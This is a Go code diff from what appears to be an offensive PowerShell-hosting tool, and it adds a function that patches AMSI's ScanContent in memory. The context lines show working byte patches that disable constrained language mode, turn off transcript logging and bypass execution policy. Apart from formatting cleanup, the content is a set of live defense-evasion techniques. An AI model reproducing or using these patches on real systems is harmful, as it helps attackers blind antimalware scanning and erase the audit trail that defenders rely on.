@@ -87,9 +87,6 @@ func ExecuteScript(appDomain *clr.AppDomain, vtPowershell clr.Variant, script st
 		return err.Error(), err
 	}
 
-
-
-
 	return res, nil
 }
 
@@ -106,25 +103,32 @@ func PatchManagedFunction(appDomain *clr.AppDomain, assemblyName string, classNa
 }
 
 func PatchSystemPolicyGetSystemLockdownPolicy(appDomain *clr.AppDomain) error {
-	buf := []byte{ 0x48, 0x31, 0xc0, 0xc3 }
+	buf := []byte{0x48, 0x31, 0xc0, 0xc3}
 	return PatchManagedFunction(appDomain, "System.Management.Automation",
 		"System.Management.Automation.Security.SystemPolicy",
 		"GetSystemLockdownPolicy", 0, buf)
 }
 
 func PatchTranscriptionOptionFlushContentToDisk(appDomain *clr.AppDomain) error {
-	buf := []byte{ 0xc3 }
+	buf := []byte{0xc3}
 	return PatchManagedFunction(appDomain, "System.Management.Automation",
 		"System.Management.Automation.Host.TranscriptionOption",
 		"FlushContentToDisk",
 		0, buf)
 }
 
+func PatchAmsiWithScanContent(appDomain *clr.AppDomain) error {
+	buf := []byte{0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0xc3}
+	return PatchManagedFunction(appDomain, "System.Management.Automation",
+		"System.Management.Automation.AmsiUtils",
+		"ScanContent",
+		2, buf)
+}
 
 func PatchAuthorizationManagerShouldRunInternal(appDomain *clr.AppDomain) error {
-	buf := []byte{ 0xc3 }
+	buf := []byte{0xc3}
 	return PatchManagedFunction(appDomain, "System.Management.Automation",
-        "System.Management.Automation.AuthorizationManager",
-        "ShouldRunInternal",
+		"System.Management.Automation.AuthorizationManager",
+		"ShouldRunInternal",
 		3, buf)
 }
